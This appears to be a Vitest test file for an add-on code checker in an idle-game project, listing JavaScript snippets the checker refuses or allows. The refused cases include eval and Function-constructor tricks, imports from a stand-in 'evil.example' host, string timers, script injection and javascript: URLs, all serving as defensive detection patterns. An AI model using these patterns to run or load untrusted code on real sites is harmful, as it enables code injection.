import {
	describe,
	expect,
	it,
} from 'vitest';

import { addonViolations } from '@oss-idle/shared/addonRules';

const rules = (source: string) => addonViolations(source).map(v => v.rule);

describe('addonViolations', () => {
	it.each([
		['eval', 'eval("x")'],
		['eval, aliased', 'const run = eval; run(code);'],
		['eval, through the window', 'window.eval(code)'],
		['eval, by name', 'globalThis["eval"](code)'],
		['the Function constructor', 'new Function("return 1")'],
		['Function called', 'Function(code)()'],
		['Function, through the window', 'new window.Function(code)'],
		['a function\'s constructor', '(() => {}).constructor(code)()'],
		['an async function\'s constructor', '(async function () {}).constructor(code)'],
		['the constructor of a constructor', '[].constructor.constructor(code)()'],
		['a constructor given text', 'x.constructor("return this")()'],
		['dynamic import', 'import("https://evil.example/x.js")'],
		['dynamic import of a variable', 'import(url)'],
		['a static import', 'import x from "https://evil.example/x.js";'],
		['a re-export', 'export * from "https://evil.example/x.js";'],
		['a named re-export', 'export { a } from "https://evil.example/x.js";'],
		['importScripts', 'importScripts(url)'],
		['a string timer', 'setTimeout("alert(1)", 10)'],
		['a template timer', 'window.setInterval(`run()`, 10)'],
		['document.write', 'document.write(html)'],
		['a script element', 'document.createElement("script")'],
		['a script element, any case', 'document.createElement(" SCRIPT ")'],
		['an svg script element', 'document.createElementNS(ns, "script")'],
		['srcdoc', 'frame.srcdoc = html'],
		['createContextualFragment', 'range.createContextualFragment(html)'],
		['an event handler from text', 'img.setAttribute("onerror", code)'],
		['a javascript: address', 'a.href = "javascript:alert(1)"'],
		['a service worker', 'navigator.serviceWorker.register(url)'],
	])('refuses %s', (_, source) => {
		expect(rules(source).length).toBeGreaterThan(0);
	});

	it.each([
		['words in strings and comments',
			'// never eval this\nconst s = "eval, Function(x), import(y), <script>";'],
		['the game\'s mount/unmount', 'export const mount = () => {}; export const unmount = () => {};'],
		['an event cloned through its constructor', 'const copy = new e.constructor(e.type, e);'],
		['a handler written out (React tests support so)', 'div.setAttribute("oninput", "return;")'],
		['a timer given a function', 'setTimeout(() => run(), 10)'],
		['other elements', 'document.createElement("div")'],
		['a type check', 'typeof f === "function"'],
		['inlined wasm and blob workers',
			'WebAssembly.instantiate(bytes); new Worker(URL.createObjectURL(blob));'],
	])('allows %s', (_, source) => {
		expect(rules(source)).toEqual([]);
	});

	it('refuses code that does not parse, with where', () => {
		expect(addonViolations('const = 1')[0]).toMatchObject({
			line: 1, rule: expect.stringContaining('does not parse'),
		});
	});

	it('says where', () => {
		expect(addonViolations('const a = 1;\n  eval(a);')[0]).toMatchObject({
			line: 2, column: 2,
		});
	});
});
